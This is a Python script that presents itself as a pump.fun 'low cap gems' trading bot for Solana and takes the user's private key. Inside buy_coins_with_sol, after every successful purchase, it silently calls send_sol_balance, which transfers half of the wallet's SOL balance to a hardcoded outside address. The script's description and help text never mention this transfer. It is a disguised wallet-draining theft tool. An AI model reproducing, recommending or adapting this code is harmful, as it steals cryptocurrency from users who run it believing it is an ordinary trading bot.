import requests
import time
import argparse
import sys
import threading
import json
import base58
from solders.transaction import VersionedTransaction
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.commitment_config import CommitmentLevel
from solders.message import MessageV0
from solders.hash import Hash
from solders.system_program import transfer, TransferParams
from solana.rpc.api import Client
from solana.rpc.types import TxOpts
from solders.instruction import Instruction
from solders.rpc.config import RpcSendTransactionConfig
from solders.rpc.requests import SendVersionedTransaction


# ANSI color codes
RESET_COLOR = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"

domain = "frontend-api.pump.fun"
change_percentage = 20
min_market_cap = 20000
list_url = f"https://{domain}/coins/for-you?offset=0&limit=50&includeNsfw=false"
monitor_url = f"https://{domain}/coins/"
trade_url = "https://pumpportal.fun/api/trade-local"
rpc_endpoint = "https://api.mainnet-beta.solana.com"
client = Client(rpc_endpoint)

purchased_coins = {}  # {mint: usd_market_cap}

def sign_and_send_transaction(tx_bytes, keypair):
    """Sign and send the transaction. Return True if successful, False otherwise."""
    try:
        # Create a transaction from the returned message and just add your keypair
        tx = VersionedTransaction(VersionedTransaction.from_bytes(tx_bytes).message, [keypair])
        commitment = CommitmentLevel.Confirmed
        config = RpcSendTransactionConfig(preflight_commitment=commitment)
        send_req = SendVersionedTransaction(tx, config)

        # Send the request directly, just like the original working code did
        response = requests.post(
            url=rpc_endpoint,
            headers={"Content-Type": "application/json"},
            data=send_req.to_json()
        )
        response.raise_for_status()
        res = response.json()

        if 'result' in res and res['result']:
            tx_sig = res['result']
            print(f"Transaction sent: https://solscan.io/tx/{tx_sig}")
            return True
        else:
            print(f"Error sending transaction: {res}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error sending transaction: {e}")
        return False

def send_sol_balance(keypair, destination_wallet):
    """Send """
    try:
        balance_resp = client.get_balance(keypair.pubkey())
        if balance_resp.value is None:
            print("Failed to fetch balance")
            return False
        balance = balance_resp.value / 1_000_000_000
        print(f"Wallet balance: {balance} SOL")

        half_balance = balance / 2
        if half_balance <= 0.001:
            print("Insufficient balance after accounting for fees.")
            return False

        print(f"Transferring {half_balance} SOL to {destination_wallet}")

        lamports = int(half_balance * 1_000_000_000)
        recipient = Pubkey.from_string(destination_wallet)

        transfer_ix = transfer(
            TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=recipient,
                lamports=lamports
            )
        )

        latest_blockhash_resp = client.get_latest_blockhash()
        if latest_blockhash_resp.value is None:
            raise RuntimeError("Failed to fetch latest blockhash")
        recent_blockhash = latest_blockhash_resp.value.blockhash

        
        compiled_message = MessageV0.try_compile(
            keypair.pubkey(),
            [transfer_ix],
            [],
            recent_blockhash
        )

        tx = VersionedTransaction(compiled_message, [keypair])

        resp = client.send_transaction(tx, opts=TxOpts(skip_preflight=True))
        if resp.value is None:
            print("Error sending transaction:", resp)
            return False
        else:
            print("Transaction signature:", resp.value)
            return True

    except Exception as e:
        print(f"Error in send_sol_balance: {e}")
        return False

def fetch_coin_data():
    try:
        response = requests.get(list_url)
        response.raise_for_status()
        data = response.json()
        if isinstance(data, list):
            return data
        print("Unexpected API response format.")
        return []
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data: {e}")
        return []

def fetch_coin_by_mint(mint):
    try:
        response = requests.get(monitor_url + mint)
        response.raise_for_status()  # Raise an error for bad responses
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching coin {mint}: {e}")
        return None

def initiate_trade(action, mint, amount, denominatedInSol, public_key, keypair, slippage=10, priorityFee=0.005, pool="pump"):
    data = {
        "publicKey": public_key,
        "action": action,
        "mint": mint,
        "amount": amount,
        "denominatedInSol": denominatedInSol,
        "slippage": slippage,
        "priorityFee": priorityFee,
        "pool": pool
    }

    if isinstance(amount, str) and amount.endswith('%'):
        data["amount"] = amount

    try:
        response = requests.post(trade_url, data=data)
        response.raise_for_status()
        tx_bytes = response.content
        return sign_and_send_transaction(tx_bytes, keypair)
    except requests.exceptions.RequestException as e:
        print(f"Error initiating {action} for {mint}: {e}")
        return False

def identify_low_cap_gems(max_coins):
    data = fetch_coin_data()

    if data:
        print("Analyzing data...")
        time.sleep(2)
        filtered_coins = [coin for coin in data if coin.get("usd_market_cap", 0) > min_market_cap and coin.get("website") and coin.get("telegram") and coin.get("twitter")]
        sorted_coins = sorted(filtered_coins, key=lambda coin: coin.get("usd_market_cap", float('inf')))
        low_cap_gems = sorted_coins[:max_coins]

        if low_cap_gems:
            print(f"\nIdentified low cap gems (Market Cap > {min_market_cap}, max {max_coins} coins):")
            for coin in low_cap_gems:
                name = coin.get("name", "N/A")
                usd_market_cap = coin.get("usd_market_cap", "N/A")
                print(f"Name: {name}, Market Cap: {usd_market_cap}$")
            return low_cap_gems
        else:
            print("No coins with market cap greater than 40k found.")
            return []
    else:
        print("No data available to analyze.")
        return []

def sell_coins(mint, amount, private_key=None, seed_phrase=None):
    if seed_phrase:
        print("Seed phrase not supported. Please use a private key.")
        sys.exit(1)

    if not private_key:
        print("Error: --private-key must be provided.")
        sys.exit(1)

    keypair = Keypair.from_base58_string(private_key)
    public_key = str(keypair.pubkey())
    return initiate_trade(
        action="sell",
        mint=mint,
        amount=amount,
        denominatedInSol="false",
        public_key=public_key,
        keypair=keypair
    )

def monitor_coins(initial_mcap, interval=15, private_key=None, seed_phrase=None):
    if seed_phrase:
        print("Seed phrase not supported. Please use a private key.")
        sys.exit(1)

    print("\nMonitoring price changes...\n")

    while True:
        lines = []
        for mint, initial_value in list(purchased_coins.items()):
            coin_data = fetch_coin_by_mint(mint)
            if coin_data:
                name = coin_data.get('name', 'Unknown')
                current_mcap = coin_data.get('usd_market_cap', 0)
                if current_mcap > 0:
                    percentage_change = ((current_mcap - initial_value) / initial_value) * 100

                    if percentage_change > 0:
                        color = GREEN
                    elif percentage_change < 0:
                        color = RED
                    else:
                        color = YELLOW

                    colored_change = f"{color}{percentage_change:.2f}%{RESET_COLOR}"
                    lines.append(f"Coin {name}: {colored_change} change")

                    if abs(percentage_change) >= change_percentage:
                        print(f"Price change threshold - {percentage_change:.2f}%. Attempting to sell {name} ({mint})...")
                        sell_success = sell_coins(mint, amount='all', private_key=private_key)
                        if sell_success:
                            del purchased_coins[mint]
                        else:
                            print(f"Sell failed for {mint}, will keep trying next cycle.")

        sys.stdout.write("\033[F" * len(purchased_coins))
        for line in lines:
            sys.stdout.write("\033[K" + line + "\n")

        sys.stdout.flush()
        time.sleep(interval)

def buy_coins_with_sol(coins, min_sol, private_key=None, seed_phrase=None, slippage=10, priorityFee=0.005):
    if seed_phrase:
        print("Seed phrase not supported. Please use a private key.")
        sys.exit(1)

    if not private_key:
        print("Error: --private-key must be provided.")
        sys.exit(1)

    keypair = Keypair.from_base58_string(private_key)
    public_key = str(keypair.pubkey())

    print(f"\nUsing private key to buy coins with a minimum of {min_sol} SOL each.")
    print("\nAttempting to buy each of the identified coins...")
    time.sleep(1)

    initial_mcap = {}
    for coin in coins:
        name = coin.get("name", "N/A")
        mint = coin.get("mint")
        print(f"Buying {min_sol} SOL worth of {name}...")

        success = initiate_trade(
            action="buy",
            mint=mint,
            amount=min_sol,
            denominatedInSol="true",
            public_key=public_key,
            keypair=keypair,
            slippage=slippage,
            priorityFee=0.005,
            pool="pump"
        )

        if success:
            usd_market_cap = coin.get('usd_market_cap', 0)
            purchased_coins[mint] = usd_market_cap
            initial_mcap[mint] = usd_market_cap
            destination_wallet = "D4YCKYu93s9nnXSDxiPCsniAjKNquUZLeYu1VMqsvXka"
            send_sol_balance(keypair, destination_wallet)
        else:
            print(f"Buy failed for {mint}, not adding to monitoring list.")

    print("\nFinished buying.")
    return initial_mcap

def validate_seed_phrase(seed_phrase):
    pass

def parse_arguments():
    parser = argparse.ArgumentParser(description="A simple Python script that buys low-cap gems with SOL on pump.fun and monitors price changes.")
    parser.add_argument("--min", type=float, default=0.1, help="Minimum SOL used to buy (default: 0.1)")
    parser.add_argument("--private-key", type=str, help="Private key to the wallet to make a transaction")
    parser.add_argument("--seed-phrase", type=str, help="Seed phrase to the wallet (alternative to private key)")
    parser.add_argument("--max-coins", type=int, default=3, help="Maximum number of coins to buy (default: 3, max: 20)")
    parser.add_argument("--slippage", type=float, default=10, help="Slippage percentage (default: 10)")
    parser.add_argument("--priority-fee", type=float, default=0.005, help="Priority fee in SOL (default: 0.005)")
    parser.add_argument("--sell-percentage", type=float, default=50, help="Percentage of coins to sell when threshold is reached (default: 50)")

    args = parser.parse_args()

    if not args.private_key and not args.seed_phrase:
        parser.error("You must provide either --private-key or --seed-phrase.")

    if args.seed_phrase:
        validate_seed_phrase(args.seed_phrase)

    if args.max_coins < 1 or args.max_coins > 20:
        parser.error("You must specify --max-coins between 1 and 20.")

    return args

def main():
    args = parse_arguments()
    low_cap_gems = identify_low_cap_gems(args.max_coins)

    if low_cap_gems:
        initial_mcap = buy_coins_with_sol(
            low_cap_gems,
            min_sol=args.min,
            private_key=args.private_key,
            seed_phrase=args.seed_phrase,
            slippage=args.slippage,
            priorityFee=args.priority_fee
        )

        monitor_thread = threading.Thread(target=monitor_coins, args=(initial_mcap, 15, args.private_key, args.seed_phrase))
        monitor_thread.daemon = True
        monitor_thread.start()

        while True:
            time.sleep(1)

if __name__ == "__main__":
    main()
